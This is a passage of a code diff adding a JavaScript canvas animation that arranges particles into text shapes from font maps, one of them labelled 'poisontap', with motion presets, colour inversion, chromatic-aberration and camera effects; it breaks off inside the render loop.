+          switch(this.fontMapData[i].map[j][k]) {
+            case 0:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = 0;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : 0,
+                y : 0,
+                z : 0
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 1:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+              break;
+            case 2:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 3:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:90};
+              break;
+            case 4:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:270};
+              break;
+            case 5:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+          };
+        };
+      };
+      lastMap += this.fontMapData[i].mapDataNum;
+    };
+    return this.returnData;
+  };
+
+
+
+  var dynamic_001 = {// bold motion
+    value : new Array(),
+    uniqueValue : {},
+    uniqueCloseValue : new closeValue(50,500),
+    init : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_001.value[i] = {
+          shade : null,
+          fill : null,
+          stroke : null,
+          size: null,
+          position: null,
+          rotate: null
+        };
+      };
+    },
+    iteration : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_001.value[i].size = 30*Math.random();
+      };
+      return dynamic_001.value;
+    }
+  };
+  dynamic_001.init();
+
+
+  var dynamic_002 = {// light motion
+    value : new Array(),
+    uniqueValue : {},
+    uniqueCloseValue : new closeValue(50,500),
+    init : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_002.value[i] = {
+          shade : null,
+          fill : null,
+          stroke : null,
+          size: null,
+          position: null,
+          rotate: null
+        };
+      };
+    },
+    iteration : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_002.value[i].size = Math.random()*8;
+      };
+      return dynamic_002.value;
+    }
+  };
+  dynamic_002.init();
+
+
+  var dynamic_003 = {// sphere motion
+    value : new Array(),
+    uniqueValue : {
+      masterDegree : {theta:0, phi:0},
+      masterControllDegree : {theta:0, phi:0},
+      masterRadius : 0,
+      masterControllRadius : 200,
+      cellDegree : new Array(),
+    },
+    uniqueCloseValue : new closeValue(50,500),
+    init : function() {
+      dynamic_003.masterControllRadius = Math.random()*200 + 100;
+      dynamic_003.masterControllDegree = {theta:0, phi:Math.random()*10-5};
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_003.value[i] = {
+          shade : null,
+          fill : null,
+          stroke : null,
+          size: null,
+          position: null,
+          rotate: null
+        };
+        dynamic_003.uniqueValue.cellDegree[i] = {
+          theta : 360 * Math.random(),
+          phi : 360 * Math.random()
+        };
+      };
+    },
+    randomInit : function() {
+      dynamic_003.masterControllRadius = Math.random()*150 + 150;
+      dynamic_003.masterControllDegree = {theta:0, phi:Math.random()*20-10};
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_003.uniqueValue.cellDegree[i] = {
+          theta : 360 * Math.random(),
+          phi : 360 * Math.random()
+        };
+      }
+    },
+    iteration : function() {
+      if(Math.random() < 0.03) dynamic_003.randomInit();
+      dynamic_003.uniqueValue.masterRadius = dynamic_003.masterControllRadius+50*Math.random();
+      dynamic_003.uniqueValue.masterDegree.phi += dynamic_003.masterControllDegree.phi;
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        var ra = polarToRectangle(
+            dynamic_003.uniqueValue.cellDegree[i].theta + dynamic_003.uniqueValue.masterDegree.theta,
+            dynamic_003.uniqueValue.cellDegree[i].phi + dynamic_003.uniqueValue.masterDegree.phi,
+            dynamic_003.uniqueValue.masterRadius
+            );
+        dynamic_003.value[i].position = {
+          x : ra.x,
+          y : ra.y,
+          z : ra.z
+        };
+        dynamic_003.value[i].size = Math.random()*5;
+      };
+      return dynamic_003.value;
+    }
+  };
+  dynamic_003.init();
+
+
+  var dynamic_004 = {// rotate motion
+    value : new Array(),
+    uniqueValue : {
+      closeValue : new Array()
+    },
+    uniqueCloseValue : new closeValue(50,500),
+    init : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_004.uniqueValue.closeValue[i] = new Object();
+        dynamic_004.uniqueValue.closeValue[i].x = new closeValue(200,500);
+        dynamic_004.uniqueValue.closeValue[i].y = new closeValue(200,500);
+        dynamic_004.uniqueValue.closeValue[i].z = new closeValue(200,500);
+        dynamic_004.value[i] = {
+          shade : null,
+          fill : null,
+          stroke : null,
+          size: null,
+          position: null,
+          rotate: {
+            x : 0,
+            y : 0,
+            z :0
+          }
+        };
+      };
+    },
+    iteration : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        dynamic_004.value[i].rotate.x = dynamic_004.uniqueValue.closeValue[0].x.execution() * 720;
+        dynamic_004.value[i].rotate.y = dynamic_004.uniqueValue.closeValue[0].y.execution() * 720;
+        dynamic_004.value[i].rotate.z = dynamic_004.uniqueValue.closeValue[0].z.execution() * 720;
+        dynamic_004.value[i].size = 5;
+      };
+      return dynamic_004.value;
+    }
+  };
+  dynamic_004.init();
+
+
+  var backgroundController = {
+    color : new String,
+    init : function() {
+      backgroundController.color = "rgba(0, 0, 0, 1)";
+    },
+    draw : function() {
+      init.ctx.fillStyle = backgroundController.color;
+      init.ctx.fillRect(0, 0, init.size.x, init.size.y);
+    }
+  };
+  backgroundController.init();
+
+
+  var nodeStroke = {
+    vertsArray : new Array(),
+    color : new String(),
+    init : function() {
+      nodeStroke.color = {
+        r : 1.0,
+        g : 1.0,
+        b : 1.0,
+        a : 0.15
+      };
+    },
+    iteration : function() {
+      nodeStroke.vertsArray = [];
+      if(shader.chromaticAberration.flag === false) {
+        init.ctx.globalCompositeOperation = "source-over";
+        for(var i=0; i<shader.shadeObject.length; i++) {
+          for(var j=0; j<shader.shadeObject[i].face.verts.length; j++) {
+            nodeStroke.vertsArray.push(shader.shadeObject[i].face.verts[j].affineOut);
+          };
+        };
+        init.ctx.beginPath();
+        for(var i=0; i<nodeStroke.vertsArray.length; i++) {
+          if(Math.random() > 0.75) {
+            init.ctx.lineTo(
+                nodeStroke.vertsArray[i].x,
+                nodeStroke.vertsArray[i].y
+                );
+          };
+        };
+        init.ctx.closePath();
+
+        init.ctx.strokeStyle = "rgba(" + 
+          nodeStroke.color.r*255 + "," + 
+          nodeStroke.color.g*255 + "," + 
+          nodeStroke.color.b*255 + "," +
+          nodeStroke.color.a
+          + ")";
+        init.ctx.stroke();
+      } else {
+        init.ctx.globalCompositeOperation = "lighter";
+        init.ctx.translate(shader.chromaticAberration.r.x,shader.chromaticAberration.r.y);
+        for(var i=0; i<shader.shadeObject.length; i++) {
+          for(var j=0; j<shader.shadeObject[i].face.verts.length; j++) {
+            nodeStroke.vertsArray.push(shader.shadeObject[i].face.verts[j].affineOut);
+          };
+        };
+        init.ctx.beginPath();
+        for(var i=0; i<nodeStroke.vertsArray.length; i++) {
+          init.ctx.lineTo(
+              nodeStroke.vertsArray[i].x,
+              nodeStroke.vertsArray[i].y
+              );
+        };
+        init.ctx.closePath();
+
+        init.ctx.strokeStyle = "rgba(" + 
+          nodeStroke.color.r*255 + "," + 
+          0 + "," + 
+          0 + "," +
+          nodeStroke.color.a/1
+          + ")";
+        init.ctx.stroke();
+        init.ctx.translate(-shader.chromaticAberration.r.x,-shader.chromaticAberration.r.y);
+
+
+        init.ctx.translate(shader.chromaticAberration.g.x,shader.chromaticAberration.g.y);
+        for(var i=0; i<shader.shadeObject.length; i++) {
+          for(var j=0; j<shader.shadeObject[i].face.verts.length; j++) {
+            nodeStroke.vertsArray.push(shader.shadeObject[i].face.verts[j].affineOut);
+          };
+        };
+        init.ctx.beginPath();
+        for(var i=0; i<nodeStroke.vertsArray.length; i++) {
+          init.ctx.lineTo(
+              nodeStroke.vertsArray[i].x,
+              nodeStroke.vertsArray[i].y
+              );
+        };
+        init.ctx.closePath();
+        init.ctx.strokeStyle = "rgba(" + 
+          0 + "," + 
+          nodeStroke.color.g*255 + "," + 
+          0 + "," +
+          nodeStroke.color.a/1.5
+          + ")";
+        init.ctx.stroke();
+        init.ctx.translate(-shader.chromaticAberration.g.x,-shader.chromaticAberration.g.y);
+
+
+        init.ctx.translate(shader.chromaticAberration.b.x,shader.chromaticAberration.b.y);
+        for(var i=0; i<shader.shadeObject.length; i++) {
+          for(var j=0; j<shader.shadeObject[i].face.verts.length; j++) {
+            nodeStroke.vertsArray.push(shader.shadeObject[i].face.verts[j].affineOut);
+          };
+        };
+        init.ctx.beginPath();
+        for(var i=0; i<nodeStroke.vertsArray.length; i++) {
+          init.ctx.lineTo(
+              nodeStroke.vertsArray[i].x,
+              nodeStroke.vertsArray[i].y
+              );
+        };
+        init.ctx.closePath();
+        init.ctx.strokeStyle = "rgba(" + 
+          0 + "," + 
+          0 + "," + 
+          nodeStroke.color.b*255 + "," +
+          nodeStroke.color.a/2
+          + ")";
+        init.ctx.stroke();
+        init.ctx.translate(-shader.chromaticAberration.b.x,-shader.chromaticAberration.b.y);
+
+      };
+    }
+  };
+  nodeStroke.init();
+
+
+  var invertController = {
+    flag : false,
+    iteration : function() {
+      if(invertController.flag == true) {
+        light.enableLight = false;
+        backgroundController.color = "rgba(255,255,255,1)";
+        nodeStroke.color.r = 0.0;
+        nodeStroke.color.g = 0.0;
+        nodeStroke.color.b = 0.0;
+        for(var i=0; i<DEFIINE_instanceNum; i++) {
+          instanceObject[i].fillColor.r = 1.0 - instanceObject[i].fillColor.r;
+          instanceObject[i].fillColor.g = 1.0 - instanceObject[i].fillColor.g;
+          instanceObject[i].fillColor.b = 1.0 - instanceObject[i].fillColor.b;
+        };
+      } else {
+        nodeStroke.color.r = 1.0;
+        nodeStroke.color.g = 1.0;
+        nodeStroke.color.b = 1.0;
+        light.enableLight = true;
+        backgroundController.color = "rgba(0,0,0,1)";
+      };
+    }
+  };
+
+
+  var effectCv = new closeValue(300, 500);
+  var effectTimer = function() {
+    var effectVal = effectCv.execution();
+    if(effectVal > 0.7) {
+      shader.chromaticAberration.flag = true;
+      shader.chromaticAberration.r.x = (effectVal-0.75)*4 * 15;
+      shader.chromaticAberration.g.x = (effectVal-0.75)*4 * 0;
+      shader.chromaticAberration.b.x = (effectVal-0.75)*4 * -15;
+    } else if(effectVal < 0.2) {
+      invertController.flag = true;
+    } else {
+      invertController.flag = false;
+      shader.chromaticAberration.flag = false;
+    };
+  };
+
+
+
+  var mousePosX = 0;
+  var mousePosY = 0;
+  document.body.onmousemove = function(e) {
+    mousePosX = (e.pageX-init.size.x)/init.size.x * 30;
+    mousePosY = (e.pageY-init.size.y)/init.size.y * 30;
+  };
+  var zoomCv = new closeValue(300, 1000);
+  var randomSelfCv = new closeValue(300, 400);
+  var rotateCv = new closeValue(300, 500);
+  var memRotateX = Math.random()*100;
+  var memRotateY = Math.random()*100;
+  rotateCv.smoothFlag = false;
+  var cameraTimer = function() {
+    var zoomVal = zoomCv.execution();
+    if(zoomVal > 0.8) {
+      camera.zoom = 1.5
+    } else if(zoomVal < 0.2) {
+      camera.zoom = 2.2;
+    } else {
+      camera.zoom = 1;
+    };
+
+    var randomSelfVal = randomSelfCv.execution();
+    if(randomSelfCv > 0.8) {
+      camera.self.x = Math.random()*10-5;
+      camera.self.y = Math.random()*10-5;
+      camera.self.z = Math.random()*10-5;
+    };
+    memRotateX += 8;
+    memRotateY += 14;
+    var rotateVal = rotateCv.execution();
+    if(rotateVal > 0.8) {
+      camera.rotate.x = memRotateX;
+      camera.rotate.y = memRotateY;
+    } else {
+      camera.rotate.x = 0;
+      camera.rotate.y = 0;
+    };
+  };
+
+  var controll = {
+    value : new Array(),
+    startValue : new Array(),
+    endValue : new Array(),
+    startFlag : new Array(),
+    startTime : new Array(),
+    durationTime : new Array(),
+    progress : new Array(),
+    processArray : new Array(),
+    staticFlag : 0,
+    staticMap : {
+      freemap_disconnected : freemap_disconnected(),
+      freemap_random : freemap_random(),
+
+      //fontMap_fullchara : fontmap_fullchara(),
+      //fontmap_solidcell : fontmap_solidcell(),
+      //fontmap_hackyou : fontmap_hackyou()
+      fontmap_poisontap: fontmap_poisontap()
+    },
+    dynamicFlag : 0,
+    dynamicMap : new Object,
+    init : function() {
+      for(var i=0; i<DEFIINE_instanceNum; i++) {
+        controll.value[i] = {
+          shade : false,
+          fill : false,
+          stroke : false,
+          fillColor: {r:0, g:0, b:0, a:0},
+          strokeColor: {r:0, g:0, b:0, a:0},
+          size: 0,
+          position: {x:Math.random()*1000-500, y:Math.random()*1000-500, z:Math.random()*1000-500},
+          rotate: {x:Math.random()*1000-500, y:Math.random()*1000-500, z:Math.random()*1000-500}
+        };
+        controll.startValue[i] = new Object();
+        controll.endValue[i] = new Object();
+        controll.startFlag[i] = false;
+        controll.startTime[i] = 0;
+        controll.progress[i] = 0;
+        controll.processArray[i] = null;
+      };
+    },
+    startTransform : function(num, durationTime) {
+      controll.startFlag[num] = true;
+      controll.durationTime[num] = durationTime;
+      controll.processArray[num] = controll.staticIteration;
+    },
+    staticIteration : function(num) {// staticIteration
+      switch(controll.staticFlag) {
+        case "freemap_disconnected":
+          controll.endValue[num] = controll.staticMap.freemap_disconnected[num];
+          break;
+        case "freemap_random":
+          controll.endValue[num] = controll.staticMap.freemap_random[num];
+          break;
+
+          /*
+             case "fontmap_fullchara":
+             controll.endValue[num] = controll.staticMap.fontMap_fullchara[num];
+             break;
+           */
+        case "fontmap_poisontap":
+          controll.endValue[num] = controll.staticMap.fontmap_poisontap[num];
+          break;
+          /*
+             case "fontmap_solidcell":
+             controll.endValue[num] = controll.staticMap.fontmap_solidcell[num];
+             break;
+             case "fontmap_hackyou":
+             controll.endValue[num] = controll.staticMap.fontmap_hackyou[num];
+             break;
+           */
+      };
+      switch(controll.endValue[num].shade) {
+        case true:
+          if(controll.startFlag[num] == true) {
+            controll.startFlag[num] = false;
+            controll.startTime[num] = Date.now();
+            controll.startValue[num] = controll.value[num];
+            controll.value[num].shade = controll.endValue[num].shade;
+
+            controll.value[num].fill = controll.endValue[num].fill;
+            controll.value[num].stroke = controll.endValue[num].stroke;
+          };
+          controll.progress[num] = Math.min(1, (Date.now()-controll.startTime[num])/controll.durationTime[num]);
+
+          if(controll.endValue[num].fillColor != null) {
+            controll.value[num].fillColor.r = controll.startValue[num].fillColor.r + (controll.endValue[num].fillColor.r - controll.startValue[num].fillColor.r) * controll.progress[num];
+            controll.value[num].fillColor.g = controll.startValue[num].fillColor.g + (controll.endValue[num].fillColor.g - controll.startValue[num].fillColor.g) * controll.progress[num];
+            controll.value[num].fillColor.b = controll.startValue[num].fillColor.b + (controll.endValue[num].fillColor.b - controll.startValue[num].fillColor.b) * controll.progress[num];
+            controll.value[num].fillColor.a = controll.startValue[num].fillColor.a + (controll.endValue[num].fillColor.a - controll.startValue[num].fillColor.a) * controll.progress[num];
+          };
+          if(controll.endValue[num].strokeColor != null) {
+            controll.value[num].strokeColor.r = controll.startValue[num].strokeColor.r + (controll.endValue[num].strokeColor.r - controll.startValue[num].strokeColor.r) * controll.progress[num];
+            controll.value[num].strokeColor.g = controll.startValue[num].strokeColor.g + (controll.endValue[num].strokeColor.g - controll.startValue[num].strokeColor.g) * controll.progress[num];
+            controll.value[num].strokeColor.b = controll.startValue[num].strokeColor.b + (controll.endValue[num].strokeColor.b - controll.startValue[num].strokeColor.b) * controll.progress[num];
+            controll.value[num].strokeColor.a = controll.startValue[num].strokeColor.a + (controll.endValue[num].strokeColor.a - controll.startValue[num].strokeColor.a) * controll.progress[num];
+          };
+          if(controll.endValue[num].size) {
+            controll.value[num].size = controll.startValue[num].size + (controll.endValue[num].size - controll.startValue[num].size) * controll.progress[num];
+          };
+          if(controll.endValue[num].position) {
+            controll.value[num].position.x = controll.startValue[num].position.x + (controll.endValue[num].position.x - controll.startValue[num].position.x) * controll.progress[num];
+            controll.value[num].position.y = controll.startValue[num].position.y + (controll.endValue[num].position.y - controll.startValue[num].position.y) * controll.progress[num];
+            controll.value[num].position.z = controll.startValue[num].position.z + (controll.endValue[num].position.z - controll.startValue[num].position.z) * controll.progress[num];
+          };
+          if(controll.endValue[num].rotate) {
+            controll.value[num].rotate.x = controll.startValue[num].rotate.x + (controll.endValue[num].rotate.x - controll.startValue[num].rotate.x) * controll.progress[num];
+            controll.value[num].rotate.y = controll.startValue[num].rotate.y + (controll.endValue[num].rotate.y - controll.startValue[num].rotate.y) * controll.progress[num];
+            controll.value[num].rotate.z = controll.startValue[num].rotate.z + (controll.endValue[num].rotate.z - controll.startValue[num].rotate.z) * controll.progress[num];
+          };
+
+          if(controll.progress[num] == 1) {
+            controll.processArray[num] = null;
+          };
+          break;
+        case false:
+          if(controll.startFlag[num] == true) {
+            controll.startFlag[num] = false;
+            controll.startTime[num] = Date.now();
+            controll.startValue[num] = controll.value[num];
+          };
+          controll.progress[num] = Math.min(1, (Date.now()-controll.startTime[num])/controll.durationTime[num]);
+
+          if(controll.endValue[num].fillColor != null) {
+            controll.value[num].fillColor.r = controll.startValue[num].fillColor.r + (controll.endValue[num].fillColor.r - controll.startValue[num].fillColor.r) * controll.progress[num];
+            controll.value[num].fillColor.g = controll.startValue[num].fillColor.g + (controll.endValue[num].fillColor.g - controll.startValue[num].fillColor.g) * controll.progress[num];
+            controll.value[num].fillColor.b = controll.startValue[num].fillColor.b + (controll.endValue[num].fillColor.b - controll.startValue[num].fillColor.b) * controll.progress[num];
+            controll.value[num].fillColor.a = controll.startValue[num].fillColor.a + (controll.endValue[num].fillColor.a - controll.startValue[num].fillColor.a) * controll.progress[num];
+          };
+          if(controll.endValue[num].strokeColor != null) {
+            controll.value[num].strokeColor.r = controll.startValue[num].strokeColor.r + (controll.endValue[num].strokeColor.r - controll.startValue[num].strokeColor.r) * controll.progress[num];
+            controll.value[num].strokeColor.g = controll.startValue[num].strokeColor.g + (controll.endValue[num].strokeColor.g - controll.startValue[num].strokeColor.g) * controll.progress[num];
+            controll.value[num].strokeColor.b = controll.startValue[num].strokeColor.b + (controll.endValue[num].strokeColor.b - controll.startValue[num].strokeColor.b) * controll.progress[num];
+            controll.value[num].strokeColor.a = controll.startValue[num].strokeColor.a + (controll.endValue[num].strokeColor.a - controll.startValue[num].strokeColor.a) * controll.progress[num];
+          };
+          if(controll.endValue[num].size != null) {
+            controll.value[num].size = controll.startValue[num].size + (controll.endValue[num].size - controll.startValue[num].size) * controll.progress[num];
+          };
+          if(controll.endValue[num].position != null) {
+            controll.value[num].position.x = controll.startValue[num].position.x + (controll.endValue[num].position.x - controll.startValue[num].position.x) * controll.progress[num];
+            controll.value[num].position.y = controll.startValue[num].position.y + (controll.endValue[num].position.y - controll.startValue[num].position.y) * controll.progress[num];
+            controll.value[num].position.z = controll.startValue[num].position.z + (controll.endValue[num].position.z - controll.startValue[num].position.z) * controll.progress[num];
+          };
+          if(controll.endValue[num].rotate != null) {
+            controll.value[num].rotate.x = controll.startValue[num].rotate.x + (controll.endValue[num].rotate.x - controll.startValue[num].rotate.x) * controll.progress[num];
+            controll.value[num].rotate.y = controll.startValue[num].rotate.y + (controll.endValue[num].rotate.y - controll.startValue[num].rotate.y) * controll.progress[num];
+            controll.value[num].rotate.z = controll.startValue[num].rotate.z + (controll.endValue[num].rotate.z - controll.startValue[num].rotate.z) * controll.progress[num];
+          };
+
+          if(controll.progress[num] == 1) {
+            controll.value[num].fill = controll.endValue[num].fill;
+            controll.value[num].stroke = controll.endValue[num].stroke;
+            controll.value[num].shade = controll.endValue[num].shade;
+            controll.processArray[num] = null;
+          };
+          break;
+      };
+    },
+    dynamicTimer : function() {
+      switch(controll.dynamicFlag) {
+        case 0:
+          controll.dynamicMap = null;
+          break;
+        case 1:
+          controll.dynamicMap = dynamic_001.iteration();
+          break;
+        case 2:
+          controll.dynamicMap = dynamic_002.iteration();
+          break;
+        case 3:
+          controll.dynamicMap = dynamic_003.iteration();
+          break;
+        case 4:
+          controll.dynamicMap = dynamic_004.iteration();
+          break;
+      };
+      if(controll.dynamicMap != null) {
+        for(var i=0; i<DEFIINE_instanceNum; i++) {
+          //boolean
+          if(controll.dynamicMap[i].shade != null) controll.value[i].shade = controll.dynamicMap[i].shade;
+          if(controll.dynamicMap[i].fill != null) controll.value[i].fill = controll.dynamicMap[i].fill;
+          if(controll.dynamicMap[i].stroke != null) controll.value[i].stroke = controll.dynamicMap[i].stroke;
+
+          //number
+          if(controll.dynamicMap[i].fillColor != null) {
+            if(controll.dynamicMap[i].fillColor.r != null) controll.value[i].fillColor.r = controll.value[i].fillColor.r + (controll.dynamicMap[i].fillColor.r - controll.value[i].fillColor.r)/4;
+            if(controll.dynamicMap[i].fillColor.g != null) controll.value[i].fillColor.g = controll.value[i].fillColor.g + (controll.dynamicMap[i].fillColor.g - controll.value[i].fillColor.g)/4;
+            if(controll.dynamicMap[i].fillColor.b != null) controll.value[i].fillColor.b = controll.value[i].fillColor.b + (controll.dynamicMap[i].fillColor.b - controll.value[i].fillColor.b)/4;
+            if(controll.dynamicMap[i].fillColor.a != null) controll.value[i].fillColor.a = controll.value[i].fillColor.a + (controll.dynamicMap[i].fillColor.a - controll.value[i].fillColor.a)/4;
+          };
+          if(controll.dynamicMap[i].strokeColor != null) {
+            if(controll.dynamicMap[i].strokeColor.r != null) controll.value[i].strokeColor.r = controll.value[i].strokeColor.r + (controll.dynamicMap[i].strokeColor.r - controll.value[i].strokeColor.r)/4;
+            if(controll.dynamicMap[i].strokeColor.g != null) controll.value[i].strokeColor.g = controll.value[i].strokeColor.g + (controll.dynamicMap[i].strokeColor.g - controll.value[i].strokeColor.g)/4;
+            if(controll.dynamicMap[i].strokeColor.b != null) controll.value[i].strokeColor.b = controll.value[i].strokeColor.b + (controll.dynamicMap[i].strokeColor.b - controll.value[i].strokeColor.b)/4;
+            if(controll.dynamicMap[i].strokeColor.a != null) controll.value[i].strokeColor.a = controll.value[i].strokeColor.a + (controll.dynamicMap[i].strokeColor.a - controll.value[i].strokeColor.a)/4;
+          };
+          if(controll.dynamicMap[i].size != null) {
+            controll.value[i].size = controll.value[i].size + (controll.dynamicMap[i].size-controll.value[i].size)/4;
+          };
+          if(controll.dynamicMap[i].position != null) {
+            if(controll.dynamicMap[i].position.x != null) controll.value[i].position.x = controll.value[i].position.x + (controll.dynamicMap[i].position.x-controll.value[i].position.x)/4;
+            if(controll.dynamicMap[i].position.y != null) controll.value[i].position.y = controll.value[i].position.y + (controll.dynamicMap[i].position.y-controll.value[i].position.y)/4;
+            if(controll.dynamicMap[i].position.z != null) controll.value[i].position.z = controll.value[i].position.z + (controll.dynamicMap[i].position.z-controll.value[i].position.z)/4;
+          };
+          if(controll.dynamicMap[i].rotate != null) {
+            if(controll.dynamicMap[i].rotate.x != null) controll.value[i].rotate.x = controll.value[i].rotate.x + (controll.dynamicMap[i].rotate.x-controll.value[i].rotate.x)/4;
+            if(controll.dynamicMap[i].rotate.y != null) controll.value[i].rotate.y = controll.value[i].rotate.y + (controll.dynamicMap[i].rotate.y-controll.value[i].rotate.y)/4;
+            if(controll.dynamicMap[i].rotate.z != null) controll.value[i].rotate.z = controll.value[i].rotate.z + (controll.dynamicMap[i].rotate.z-controll.value[i].rotate.z)/4;
+          };
+        };
+      };
+    }
+  };
+  controll.init();
+
+  var staticTransformSeries = function(t) {
+    var inc = 0;
+    var to = function() {
+      setTimeout(function() {
+        controll.startTransform(inc, t);
+        inc++;
+        if(inc < DEFIINE_instanceNum) {
+          to();
+        };
+      }, 0);
+    };
+    to();
+  };
+  var staticTransformParallel = function(t) {
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      controll.startTransform(i, t);
+    };
+  };
+
+
+
+  objectInit();
+  var loop = function() {
+    cameraTimer();
+
+    init.ctx.clearRect(0, 0, init.size.x, init.size.y);
+    backgroundController.draw();
+    shader.shadeObject = [];
+    for(var i=0; i<controll.processArray.length; i++) if(controll.processArray[i] != null) controll.processArray[i](i);
+    controll.dynamicTimer();
+    objectUpdate();
+    shader.zSort();
+    shader.flatShader.directionalLighting();
+
+    invertController.iteration();
+    effectTimer();
+    if(init.nodeStrokeFlag == true) nodeStroke.iteration();
+
+    shader.execution();
+  };
+  var timerIteration = function() {
+    setTimeout(function() {
+      loop();
+      if (!_stop)
+        timerIteration();
+      else
+      {
+        init.ctx.globalAlpha = 1;
